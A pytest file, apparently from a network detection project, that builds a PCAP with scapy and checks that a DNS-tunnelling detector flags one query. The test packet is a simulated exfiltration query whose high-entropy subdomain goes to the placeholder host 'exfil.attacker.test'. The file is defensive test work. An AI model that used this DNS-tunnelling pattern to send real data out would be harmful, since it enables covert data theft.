from __future__ import annotations

from pathlib import Path

import pytest
from scapy.all import DNS, DNSQR, IP, UDP, Ether, rdpcap, wrpcap

pytest.importorskip("scapy")


def generate_dns_tunnel_pcap(tmp_path: Path) -> Path:
    """
    Gera um PCAP com:
    - queries DNS normais (baixa entropia)
    - uma query com subdomínio longo e alta entropia (base32-like)
    """
    normal = [
        Ether()
        / IP(src="10.0.0.5", dst="10.0.0.53")
        / UDP(sport=53000, dport=53)
        / DNS(rd=1, qd=DNSQR(qname="www.example.com")),
        Ether()
        / IP(src="10.0.0.5", dst="10.0.0.53")
        / UDP(sport=53001, dport=53)
        / DNS(rd=1, qd=DNSQR(qname="api.github.com")),
    ]

    # Subdomínio alto-entropia (simula payload codificado) + domínio fixo
    # 32 símbolos (base32-ish) repetidos para manter distribuição uniforme
    # -> entropia próxima de log2(32) = 5.0 bits/caractere.
    high_entropy_label = "abcdefghijklmnopqrstuvwxyz234567abcdefghijklmnopqrstuvwxyz234567"
    tunneled = (
        Ether()
        / IP(src="10.0.0.9", dst="10.0.0.53")
        / UDP(sport=54000, dport=53)
        / DNS(rd=1, qd=DNSQR(qname=f"{high_entropy_label}.exfil.attacker.test"))
    )

    path = tmp_path / "dns_tunnel.pcap"
    wrpcap(str(path), [*normal, tunneled])
    return path


def test_detects_dns_tunneling_by_entropy(tmp_path: Path) -> None:
    from src.detectors.dns_tunnel import detect

    pcap = generate_dns_tunnel_pcap(tmp_path)
    alerts = detect(rdpcap(str(pcap)))

    assert len(alerts) == 1
    assert alerts[0].scan_type == "DNS_TUNNELING"
    assert alerts[0].src_ip == "10.0.0.9"
